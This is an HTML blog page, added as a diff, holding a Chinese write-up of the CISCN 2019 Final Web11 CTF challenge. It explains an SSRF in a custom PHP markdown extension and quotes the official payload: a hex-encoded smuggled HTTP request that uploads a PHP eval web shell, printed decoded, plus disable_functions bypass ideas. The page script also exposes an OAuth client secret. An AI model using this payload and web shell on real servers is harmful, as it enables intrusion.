@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            CISCN 2019 Final Web11题解
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/07/29/CISCN 2019 Final Web11题解/"> 
+                    CISCN 2019 Final Web11题解 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-07-29   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#CISCN-2019-Final-Web11题解"><span class="toc-list-text">CISCN 2019 Final Web11题解</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#简述"><span class="toc-list-text">简述</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#思路"><span class="toc-list-text">思路</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#解题步骤"><span class="toc-list-text">解题步骤</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#后续"><span class="toc-list-text">后续</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="CISCN-2019-Final-Web11题解"><a href="#CISCN-2019-Final-Web11题解" class="headerlink" title="CISCN 2019 Final Web11题解"></a>CISCN 2019 Final Web11题解</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p>
+<p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：</p>
+<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p>
+<p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p>
+<pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p>
+<p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p>
+<p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p>
+<p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p>
+<p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p>
+<p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p>
+<p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p>
+<p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p>
+<p>官方payload:</p>
+<pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)
+data=data.decode(&#39;hex&#39;)
+requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>对data进行decode，值如下</p>
+<pre><code>POST /upload.php HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh,en-US;q=0.7,en;q=0.3
+Referer: http://127.0.0.1:8080/index.php?act=upload
+Content-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797
+Content-Length: 244
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------6693638881479522630623693797
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;logout.php&quot;
+Content-Type: text/php
+
+&lt;?php 
+eval($_REQUEST[a]);
+
+-----------------------------6693638881479522630623693797--</code></pre><p>这样不难理解判断的核心就是是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p>
+<p>但是还有一点不理解的是为什么先进行了一次本地请求？按照我的理解是path只经过一次传参，是不可能请求两次的。后来询问出题的师傅说，对debug参数是可以进行两次http请求的，而第一个发送sadfas是为了保持http的连接不被中断。</p>
+<p>data则是让server帮我们请求Upload并上传md文件</p>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p>
+<p>逆向功底太差了…有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11题解/">https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11题解/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2025/01/01/CTF比赛常用-持续更新/">  置顶-持续更新中的CTF备忘录</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/07/13/从一次漏洞挖掘入门ldap注入/"> 记一次LDAP注入漏洞入门到挖掘实例 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Mon Jul 29 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
